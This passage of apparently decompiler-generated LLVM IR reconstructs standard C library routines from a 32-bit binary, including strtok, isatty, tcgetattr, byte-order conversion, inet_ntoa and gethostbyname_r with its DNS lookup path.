  %v6_805182b22 = or i32 %v3_805182b20, %v5_805182b21
  %v4_805182d23 = icmp eq i8 %v2_805182b19, 0
  %v1_805182f24 = icmp eq i1 %v4_805182d23, false
  br i1 %v1_805182f24, label %dec_label_pc_8051835.lr.ph, label %dec_label_pc_8051865

dec_label_pc_8051863:                             ; preds = %dec_label_pc_8051859
  br label %dec_label_pc_8051865

dec_label_pc_8051865:                             ; preds = %dec_label_pc_8051860, %entry, %dec_label_pc_8051855, %dec_label_pc_8051863
  %storemerge = phi i32 [ 0, %dec_label_pc_8051863 ], [ %v4_805181f, %entry ], [ %v1_8051860, %dec_label_pc_8051860 ], [ %v0_805186037, %dec_label_pc_8051855 ]
  store i32 %v0_805181b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805182b19, { 1, 2, 0 }
  uselistorder i8 %v2_805182b, { 1, 2, 0 }
  uselistorder i8* %v1_805182b, { 1, 0 }
  uselistorder i32 %v0_8051842, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805185625, { 1, 0 }
  uselistorder i8 %v2_805182b1931, { 0, 2, 1 }
  uselistorder i8* %v1_805182b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051865, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051835, { 1, 0 }
  uselistorder label %dec_label_pc_8051835.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805187c = inttoptr i32 %arg1 to i8*
  %v4_805187c = call i32 @strtok_r(i8* %v3_805187c, i32 %arg2, i32 ptrtoint (i32* @global_var_80675c0.722 to i32))
  ret i32 %v4_805187c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8051894 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8051899 = icmp eq i32 %v3_8051894, 0
  %v1_805189b = zext i1 %v1_8051899 to i32
  ret i32 %v1_805189b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80518a8 = load i32, i32* @esi, align 4
  %v0_80518a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80518a9, i32* %stack_var_-8, align 4
  %v2_80518ad = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80518ad, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_80518bf = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_80518ad)
  store i32 %v3_80518bf, i32* %eax.global-to-local, align 4
  store i32 %v3_80518bf, i32* @esi, align 4
  %v1_80518c9 = icmp eq i32 %v3_80518bf, 0
  %v1_80518cb = icmp eq i1 %v1_80518c9, false
  br i1 %v1_80518cb, label %dec_label_pc_8051910, label %dec_label_pc_80518cd

dec_label_pc_80518cd:                             ; preds = %entry
  %v3_80518cd = load i32, i32* %stack_var_-44, align 4
  %v1_80518d1 = load i32, i32* @ebx, align 4
  %v2_80518d1 = inttoptr i32 %v1_80518d1 to i32*
  store i32 %v3_80518cd, i32* %v2_80518d1, align 4
  %v1_80518d7 = load i32, i32* @ebx, align 4
  %v2_80518d7 = add i32 %v1_80518d7, 4
  %v3_80518d7 = inttoptr i32 %v2_80518d7 to i32*
  %v1_80518de = load i32, i32* @ebx, align 4
  %v2_80518de = add i32 %v1_80518de, 8
  %v3_80518de = inttoptr i32 %v2_80518de to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80518e5 = load i32, i32* @ebx, align 4
  %v2_80518e5 = add i32 %v1_80518e5, 12
  %v3_80518e5 = inttoptr i32 %v2_80518e5 to i32*
  store i32 %tmp3, i32* %v3_80518e5, align 4
  %v4_80518e8 = zext i8 %tmp to i32
  %v5_80518e8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80518e8 = and i32 %v5_80518e8, -256
  %v7_80518e8 = or i32 %v6_80518e8, %v4_80518e8
  store i32 %v7_80518e8, i32* %eax.global-to-local, align 4
  %v2_80518ec = load i32, i32* @ebx, align 4
  %v3_80518ec = add i32 %v2_80518ec, 16
  %v4_80518ec = inttoptr i32 %v3_80518ec to i8*
  store i8 %tmp, i8* %v4_80518ec, align 1
  %v0_80518ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80518f2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_80518f7 = load i32, i32* @ebx, align 4
  %v1_80518f7 = add i32 %v0_80518f7, 17
  store i32 %v1_80518f7, i32* %eax.global-to-local, align 4
  %v4_80518fb = call i32 @__GI_mempcpy(i32 %v1_80518f7, i32 %v2_80518f2, i32 19, i32 %v0_80518ef)
  store i32 %v4_80518fb, i32* %eax.global-to-local, align 4
  %v3_8051908 = inttoptr i32 %v4_80518fb to i8*
  %v4_8051908 = call i32 @__GI_memset(i8* %v3_8051908, i32 0, i32 13)
  store i32 %v4_8051908, i32* %eax.global-to-local, align 4
  %v0_8051910.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051910

dec_label_pc_8051910:                             ; preds = %entry, %dec_label_pc_80518cd
  %v0_8051910 = phi i32 [ %v3_80518bf, %entry ], [ %v0_8051910.pre, %dec_label_pc_80518cd ]
  store i32 %v0_8051910, i32* %eax.global-to-local, align 4
  %v2_8051915 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051915, i32* @ebx, align 4
  store i32 %v0_80518a8, i32* @esi, align 4
  ret i32 %v0_8051910

; uselistorder directives
  uselistorder i32 %v0_8051910, { 1, 0 }
  uselistorder i32 %v3_80518bf, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051910, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805191c = trunc i32 %arg1 to i16
  %v2_805191c = call i16 @llvm.bswap.i16(i16 %v1_805191c)
  %v3_805191c = zext i16 %v2_805191c to i32
  ret i32 %v3_805191c
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8051928 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8051928
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805192f = trunc i32 %arg1 to i16
  %v2_805192f = call i16 @llvm.bswap.i16(i16 %v1_805192f)
  %v3_805192f = zext i16 %v2_805192f to i32
  ret i32 %v3_805192f
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805193b = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805193b
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051940 = load i32, i32* @edi, align 4
  %v0_8051941 = load i32, i32* @esi, align 4
  %v0_8051942 = load i32, i32* @ebx, align 4
  store i32 %v0_8051942, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_805194d = add i32 %arg2, 15
  store i32 %v1_805194d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8051952 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8051952, 16777216
  %v1_8051954 = sdiv i32 %sext, 16777216
  store i32 %v1_8051954, i32* @ebx, align 4
  br label %dec_label_pc_8051958

dec_label_pc_8051958:                             ; preds = %entry, %dec_label_pc_805197d
  %v0_805195b17 = phi i32 [ %v1_8051954, %entry ], [ %v2_805197d, %dec_label_pc_805197d ]
  %v0_805198816 = phi i32 [ %v1_805194d, %entry ], [ %v0_8051981, %dec_label_pc_805197d ]
  %v1_805195d = urem i32 %v0_805195b17, 256
  %v5_805196b = inttoptr i32 %v0_805198816 to i8*
  %v6_805196b = call i32 @_uintmaxtostr(i8* %v5_805196b, i32 %v1_805195d, i32 0, i32 -10, i32 0)
  %v0_8051973 = load i32, i32* @esi, align 4
  %v1_8051973 = icmp eq i32 %v0_8051973, 0
  %v1_8051975 = add i32 %v6_805196b, -1
  store i32 %v1_8051975, i32* %ecx.global-to-local, align 4
  br i1 %v1_8051973, label %dec_label_pc_805197d, label %dec_label_pc_805197a

dec_label_pc_805197a:                             ; preds = %dec_label_pc_8051958
  %v1_805197a = inttoptr i32 %v0_8051973 to i8*
  store i8 46, i8* %v1_805197a, align 1
  %v0_8051981.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805197d

dec_label_pc_805197d:                             ; preds = %dec_label_pc_8051958, %dec_label_pc_805197a
  %v0_8051981 = phi i32 [ %v1_8051975, %dec_label_pc_8051958 ], [ %v0_8051981.pre, %dec_label_pc_805197a ]
  %v0_805197d = load i32, i32* @ebx, align 4
  %v2_805197d = udiv i32 %v0_805197d, 256
  store i32 %v2_805197d, i32* @ebx, align 4
  %v0_8051980 = load i32, i32* @edi, align 4
  %v1_8051980 = add i32 %v0_8051980, 1
  store i32 %v1_8051980, i32* @edi, align 4
  store i32 %v0_8051981, i32* @esi, align 4
  %v7_8051986 = icmp sgt i32 %v1_8051980, 3
  br i1 %v7_8051986, label %dec_label_pc_8051988, label %dec_label_pc_8051958

dec_label_pc_8051988:                             ; preds = %dec_label_pc_805197d
  %v1_8051988 = add i32 %v0_8051981, 1
  %v2_805198b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805198b, i32* @ebx, align 4
  store i32 %v0_8051941, i32* @esi, align 4
  store i32 %v0_8051940, i32* @edi, align 4
  ret i32 %v1_8051988

; uselistorder directives
  uselistorder i32 %v0_8051981, { 0, 2, 1 }
  uselistorder i32 %v1_8051954, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805197d, { 1, 0 }
  uselistorder label %dec_label_pc_8051958, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805199b = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80675c4.723 to i32))
  ret i32 %v2_805199b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_80519a7 = ptrtoint i32* %stack_var_-4 to i32
  %v2_80519b0 = inttoptr i32 %arg1 to i8*
  %v3_80519b0 = call i32 @inet_aton(i8* %v2_80519b0, i32 %v2_80519a7)
  %v1_80519bb = icmp eq i32 %v3_80519b0, 0
  br i1 %v1_80519bb, label %dec_label_pc_80519c3, label %dec_label_pc_80519bf

dec_label_pc_80519bf:                             ; preds = %entry
  %v3_80519bf = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80519c3

dec_label_pc_80519c3:                             ; preds = %entry, %dec_label_pc_80519bf
  %v0_80519c3 = phi i32 [ -1, %entry ], [ %v3_80519bf, %dec_label_pc_80519bf ]
  ret i32 %v0_80519c3

; uselistorder directives
  uselistorder label %dec_label_pc_80519c3, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80519cf = call i32 @__GI___h_errno_location()
  %v0_80519d4 = load i32, i32* @edx, align 4
  %v2_80519d7 = ptrtoint i32* %stack_var_-4 to i32
  %v9_80519ef = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80677ac.725, i32 ptrtoint (i32* @global_var_80675e0.724 to i32), i32 460, i32 %v2_80519d7, i32 %v0_80519cf, i32 %v0_80519d4, i32 %v0_80519d4)
  %v3_80519f4 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_80519f4
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_80519fc = load i32, i32* @ebp, align 4
  %v0_80519fd = load i32, i32* @edi, align 4
  %v0_80519fe = load i32, i32* @esi, align 4
  %v0_80519ff = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8051a0f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8051a0f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8051a1a = icmp eq i32 %arg1, 0
  br i1 %v4_8051a1a, label %dec_label_pc_8051d26, label %dec_label_pc_8051a25

dec_label_pc_8051a25:                             ; preds = %entry
  %v1_8051a25 = call i32 @__errno_location(i32 %v0_80519ff)
  store i32 %v1_8051a25, i32* %eax.global-to-local, align 4
  store i32 %v1_8051a25, i32* @esi, align 4
  %v1_8051a2c = inttoptr i32 %v1_8051a25 to i32*
  %v2_8051a2c = load i32, i32* %v1_8051a2c, align 4
  store i32 %v2_8051a2c, i32* @edi, align 4
  store i32 0, i32* %v1_8051a2c, align 4
  %v0_8051a3d = load i32, i32* @ebx, align 4
  store i32 %v0_8051a3d, i32* %stack_var_-108, align 4
  %v7_8051a49 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8051a3d, i32 %arg5, i32 %arg6, i32 %v1_8051a25)
  store i32 %v7_8051a49, i32* %eax.global-to-local, align 4
  %v1_8051a51 = icmp eq i32 %v7_8051a49, 0
  br i1 %v1_8051a51, label %dec_label_pc_8051d26, label %dec_label_pc_8051a59

dec_label_pc_8051a59:                             ; preds = %dec_label_pc_8051a25
  %v1_8051a5d = inttoptr i32 %arg6 to i32*
  %v2_8051a5d = load i32, i32* %v1_8051a5d, align 4
  store i32 %v2_8051a5d, i32* %edx.global-to-local, align 4
  %v9_8051a5f = icmp eq i32 %v2_8051a5d, 1
  br i1 %v9_8051a5f, label %dec_label_pc_8051a79, label %dec_label_pc_8051a64

dec_label_pc_8051a64:                             ; preds = %dec_label_pc_8051a59
  %v9_8051a64 = icmp eq i32 %v2_8051a5d, 4
  br i1 %v9_8051a64, label %dec_label_pc_8051a79, label %dec_label_pc_8051a69

dec_label_pc_8051a69:                             ; preds = %dec_label_pc_8051a64
  %v1_8051a69 = add i32 %v2_8051a5d, 1
  %v8_8051a69 = icmp eq i32 %v1_8051a69, 0
  store i32 %v1_8051a69, i32* %edx.global-to-local, align 4
  %v1_8051a6a = icmp eq i1 %v8_8051a69, false
  br i1 %v1_8051a6a, label %dec_label_pc_8051d26, label %dec_label_pc_8051a70

dec_label_pc_8051a70:                             ; preds = %dec_label_pc_8051a69
  %v0_8051a70 = load i32, i32* @esi, align 4
  %v1_8051a70 = inttoptr i32 %v0_8051a70 to i32*
  %v2_8051a70 = load i32, i32* %v1_8051a70, align 4
  %v11_8051a70 = icmp eq i32 %v2_8051a70, 2
  %v1_8051a73 = icmp eq i1 %v11_8051a70, false
  br i1 %v1_8051a73, label %dec_label_pc_8051d26, label %dec_label_pc_8051a79

dec_label_pc_8051a79:                             ; preds = %dec_label_pc_8051a70, %dec_label_pc_8051a64, %dec_label_pc_8051a59
  %v0_8051a79 = load i32, i32* @ebp, align 4
  store i32 %v0_8051a79, i32* %eax.global-to-local, align 4
  %v0_8051a7b = load i32, i32* @edi, align 4
  %v1_8051a7b = load i32, i32* @esi, align 4
  %v2_8051a7b = inttoptr i32 %v1_8051a7b to i32*
  store i32 %v0_8051a7b, i32* %v2_8051a7b, align 4
  %v0_8051a7d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a7d = sub i32 0, %v0_8051a7d
  %v1_8051a7f = urem i32 %v1_8051a7d, 4
  %v2_8051a7f = icmp eq i32 %v1_8051a7f, 0
  store i32 %v1_8051a7f, i32* %eax.global-to-local, align 4
  %v0_8051a94.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8051a7f, label %dec_label_pc_8051a90, label %dec_label_pc_8051a84

dec_label_pc_8051a84:                             ; preds = %dec_label_pc_8051a79
  %v2_8051a84 = sub i32 %v0_8051a94.pre, %v1_8051a7f
  %v7_8051a84 = icmp ult i32 %v0_8051a94.pre, %v1_8051a7f
  br i1 %v7_8051a84, label %dec_label_pc_8051d21, label %dec_label_pc_8051a8c

dec_label_pc_8051a8c:                             ; preds = %dec_label_pc_8051a84
  %v0_8051a8c = load i32, i32* @ebp, align 4
  %v2_8051a8c = add i32 %v0_8051a8c, %v1_8051a7f
  store i32 %v2_8051a8c, i32* @ebp, align 4
  store i32 %v2_8051a84, i32* @ebx, align 4
  br label %dec_label_pc_8051a90

dec_label_pc_8051a90:                             ; preds = %dec_label_pc_8051a79, %dec_label_pc_8051a8c
  %v0_8051a94 = phi i32 [ %v2_8051a84, %dec_label_pc_8051a8c ], [ %v0_8051a94.pre, %dec_label_pc_8051a79 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8051a5d, align 4
  %tmp43 = icmp ult i32 %v0_8051a94, 4
  br i1 %tmp43, label %dec_label_pc_8051d21, label %dec_label_pc_8051aa3

dec_label_pc_8051aa3:                             ; preds = %dec_label_pc_8051a90
  %v0_8051aa3 = load i32, i32* @ebx, align 4
  %v1_8051aa3 = add i32 %v0_8051aa3, -4
  store i32 %v1_8051aa3, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8051aa3, 8
  br i1 %tmp44, label %dec_label_pc_8051d21, label %dec_label_pc_8051aaf

dec_label_pc_8051aaf:                             ; preds = %dec_label_pc_8051aa3
  %v0_8051aaf = load i32, i32* @ebp, align 4
  %v1_8051aaf = add i32 %v0_8051aaf, 4
  store i32 %v1_8051aaf, i32* %edx.global-to-local, align 4
  %v1_8051ab2 = add i32 %v0_8051aa3, -12
  store i32 %v1_8051ab2, i32* %eax.global-to-local, align 4
  store i32 %v1_8051aaf, i32* %stack_var_-92, align 4
  %v3_8051abb = inttoptr i32 %v1_8051aaf to i32*
  store i32 %v0_8051aaf, i32* %v3_8051abb, align 4
  %v0_8051abe = load i32, i32* %edx.global-to-local, align 4
  %v1_8051abe = add i32 %v0_8051abe, 4
  %v2_8051abe = inttoptr i32 %v1_8051abe to i32*
  store i32 0, i32* %v2_8051abe, align 4
  %tmp45 = icmp ult i32 %v1_8051ab2, 32
  br i1 %tmp45, label %dec_label_pc_8051d21, label %dec_label_pc_8051acb

dec_label_pc_8051acb:                             ; preds = %dec_label_pc_8051aaf
  %v0_8051acb = load i32, i32* @ebx, align 4
  %v1_8051acb = add i32 %v0_8051acb, -44
  store i32 %v1_8051acb, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8051acb, 256
  br i1 %tmp46, label %dec_label_pc_8051d21, label %dec_label_pc_8051ade

dec_label_pc_8051ade:                             ; preds = %dec_label_pc_8051acb
  %v0_8051ade = load i32, i32* @ebp, align 4
  %v1_8051ade = add i32 %v0_8051ade, 12
  %v1_8051ae1 = add i32 %v0_8051ade, 44
  store i32 %v1_8051ae1, i32* @edi, align 4
  store i32 %v1_8051ae1, i32* %stack_var_-108, align 4
  %v3_8051af2 = inttoptr i32 %v1_8051ae1 to i8*
  %v4_8051af2 = call i32 @strncpy(i8* %v3_8051af2, i32 %arg1, i32 %v1_8051acb)
  %v0_8051af7 = load i32, i32* @edi, align 4
  %v1_8051af7 = load i32, i32* @ebp, align 4
  %v2_8051af7 = add i32 %v1_8051af7, 12
  %v3_8051af7 = inttoptr i32 %v2_8051af7 to i32*
  store i32 %v0_8051af7, i32* %v3_8051af7, align 4
  %v1_8051afe = add i32 %v0_8051ade, 16
  %v2_8051afe = inttoptr i32 %v1_8051afe to i32*
  store i32 0, i32* %v2_8051afe, align 4
  %v2_8051b05 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8051b05, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8051b07 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8051b0c = inttoptr i32 %arg1 to i8*
  %v3_8051b0c = call i32 @inet_aton(i8* %v2_8051b0c, i32 %v0_8051b07)
  store i32 %v3_8051b0c, i32* %eax.global-to-local, align 4
  %v1_8051b14 = icmp eq i32 %v3_8051b0c, 0
  br i1 %v1_8051b14, label %dec_label_pc_8051b50, label %dec_label_pc_8051b18

dec_label_pc_8051b18:                             ; preds = %dec_label_pc_8051ade
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8051b1c = load i32, i32* @edi, align 4
  store i32 %v0_8051b1c, i32* %arg2, align 4
  %v1_8051b1e = add i32 %tmp18, 8
  %v2_8051b1e = inttoptr i32 %v1_8051b1e to i32*
  store i32 2, i32* %v2_8051b1e, align 4
  %v0_8051b25 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b25 = add i32 %v0_8051b25, 12
  %v2_8051b25 = inttoptr i32 %v1_8051b25 to i32*
  store i32 4, i32* %v2_8051b25, align 4
  %v2_8051b2c = load i32, i32* %stack_var_-92, align 4
  %v1_8051b2f = load i32, i32* %edx.global-to-local, align 4
  %v2_8051b2f = add i32 %v1_8051b2f, 16
  %v3_8051b2f = inttoptr i32 %v2_8051b2f to i32*
  store i32 %v2_8051b2c, i32* %v3_8051b2f, align 4
  %v1_8051b36 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051b36 = add i32 %v1_8051b36, 4
  %v3_8051b36 = inttoptr i32 %v2_8051b36 to i32*
  store i32 %v1_8051ade, i32* %v3_8051b36, align 4
  %v0_8051b3d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051b3d, i32* %v1_8051a0f, align 4
  store i32 0, i32* %v1_8051a5d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d26

dec_label_pc_8051b50:                             ; preds = %dec_label_pc_8051ade
  %v0_8051b50 = call i32 @__open_nameservers()
  store i32 %v0_8051b50, i32* @eax, align 4
  %v2_8051b60 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8051b60, i32* @ebx, align 4
  store i32 %v2_8051b60, i32* %stack_var_-108, align 4
  %v2_8051b65 = call i32 @__pthread_return_void(i32 %v2_8051b60, i32 134560279)
  store i32 %v2_8051b65, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* %stack_var_-108, align 4
  %v1_8051b71 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061548.726 to i32))
  store i32 ptrtoint (i32* @global_var_8061548.726 to i32), i32* @ecx, align 4
  store i32 134560279, i32* @eax, align 4
  store i32 %v2_8051b60, i32* %stack_var_-108, align 4
  %v0_8051b7b = load i32, i32* @global_var_8067c34.727, align 4
  store i32 %v0_8051b7b, i32* @esi, align 4
  %v2_8051b81 = call i32 @__pthread_return_void(i32 %v2_8051b60, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8051b9c = ptrtoint i32* %stack_var_-76 to i32
  %v2_8051ba1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051ba1, i32* %eax.global-to-local, align 4
  store i32 %v2_8051ba1, i32* %stack_var_-108, align 4
  %v0_8051bab = load i32, i32* @esi, align 4
  %v7_8051bb2 = call i32 @__dns_lookup(i8* %v2_8051b0c, i32 1, i32 %v0_8051bab, i32 ptrtoint (i32* @global_var_8067c28.728 to i32), i32 %v2_8051ba1, i32 %v2_8051b9c)
  store i32 %v7_8051bb2, i32* %eax.global-to-local, align 4
  %v2_8051bba = icmp slt i32 %v7_8051bb2, 0
  %v1_8051bbc = icmp eq i1 %v2_8051bba, false
  br i1 %v1_8051bbc, label %dec_label_pc_8051bd2, label %dec_label_pc_8051bbe

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051b50
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8051a5d, align 4
  br label %dec_label_pc_8051d26

dec_label_pc_8051bd2:                             ; preds = %dec_label_pc_8051b50
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8051be5 = icmp ugt i32 %v1_8051acb, 256
  %v15_8051be5 = icmp eq i32 %v0_8051acb, 300
  %v2_8051be9 = or i1 %v15_8051be5, %v10_8051be5
  br i1 %v2_8051be9, label %dec_label_pc_8051c84, label %dec_label_pc_8051beb

dec_label_pc_8051beb:                             ; preds = %dec_label_pc_8051bd2
  %v3_8051bee = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8051bee, i32* %stack_var_-108, align 4
  %v1_8051bf2 = call i32 @free(i32 %v3_8051bee)
  store i32 %v1_8051bf2, i32* %eax.global-to-local, align 4
  store i32 %v3_8051bee, i32* @edi, align 4
  %v3_8051bf8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051bf8, i32* %stack_var_-108, align 4
  %v1_8051bfc = call i32 @free(i32 %v3_8051bf8)
  store i32 -1, i32* %v1_8051a5d, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051cfc

dec_label_pc_8051c84:                             ; preds = %dec_label_pc_8051bd2
  %v3_8051c89.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8051c8d.pre = load i32, i32* @edi, align 4
  store i32 %v0_8051c8d.pre, i32* %stack_var_-108, align 4
  %v3_8051c8e = inttoptr i32 %v0_8051c8d.pre to i8*
  %v4_8051c8e = call i32 @strncpy(i8* %v3_8051c8e, i32 %v3_8051c89.pre, i32 %v1_8051acb)
  store i32 %v4_8051c8e, i32* %eax.global-to-local, align 4
  %v3_8051c94 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8051c94, i32* %stack_var_-108, align 4
  %v1_8051c98 = call i32 @free(i32 %v3_8051c94)
  store i32 %v1_8051c98, i32* %eax.global-to-local, align 4
  %v12_8051ca0 = icmp eq i32 %tmp10, 1
  %v1_8051ca5 = icmp eq i1 %v12_8051ca0, false
  br i1 %v1_8051ca5, label %dec_label_pc_8051d01, label %dec_label_pc_8051ca7

dec_label_pc_8051ca7:                             ; preds = %dec_label_pc_8051c84
  %v0_8051ca7 = load i32, i32* @edx, align 4
  %v0_8051cae = load i32, i32* @ebp, align 4
  store i32 %v0_8051cae, i32* %stack_var_-108, align 4
  %v3_8051caf = inttoptr i32 %tmp to i16*
  %v4_8051caf = call i32 @memcpy(i16* %v3_8051caf, i32 4, i32 %v0_8051ca7)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8051cb8 = load i32, i32* @edi, align 4
  store i32 %v0_8051cb8, i32* %arg2, align 4
  %v1_8051cba = add i32 %tmp18, 8
  %v2_8051cba = inttoptr i32 %v1_8051cba to i32*
  store i32 2, i32* %v2_8051cba, align 4
  %v0_8051cc1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cc1 = add i32 %v0_8051cc1, 12
  %v2_8051cc1 = inttoptr i32 %v1_8051cc1 to i32*
  store i32 4, i32* %v2_8051cc1, align 4
  %v3_8051cc8 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8051cc8, i32* %edx.global-to-local, align 4
  %v1_8051ccc = load i32, i32* %eax.global-to-local, align 4
  %v2_8051ccc = add i32 %v1_8051ccc, 16
  %v3_8051ccc = inttoptr i32 %v2_8051ccc to i32*
  store i32 %v3_8051cc8, i32* %v3_8051ccc, align 4
  %v1_8051cd3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051cd3 = add i32 %v1_8051cd3, 4
  %v3_8051cd3 = inttoptr i32 %v2_8051cd3 to i32*
  store i32 %v1_8051ade, i32* %v3_8051cd3, align 4
  %v2_8051cd6 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8051cd6, i32* %eax.global-to-local, align 4
  %v3_8051cd7 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051cd7, i32* %stack_var_-108, align 4
  %v1_8051cdb = call i32 @free(i32 %v3_8051cd7)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8051a0f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8051a5d, align 4
  br label %dec_label_pc_8051cfc

dec_label_pc_8051cfc:                             ; preds = %dec_label_pc_8051d01, %dec_label_pc_8051beb, %dec_label_pc_8051ca7
  br label %dec_label_pc_8051d26

dec_label_pc_8051d01:                             ; preds = %dec_label_pc_8051c84
  %v3_8051d04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051d04, i32* %stack_var_-108, align 4
  %v1_8051d08 = call i32 @free(i32 %v3_8051d04)
  store i32 1, i32* %v1_8051a5d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051cfc

dec_label_pc_8051d21:                             ; preds = %dec_label_pc_8051acb, %dec_label_pc_8051aaf, %dec_label_pc_8051aa3, %dec_label_pc_8051a90, %dec_label_pc_8051a84
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d26

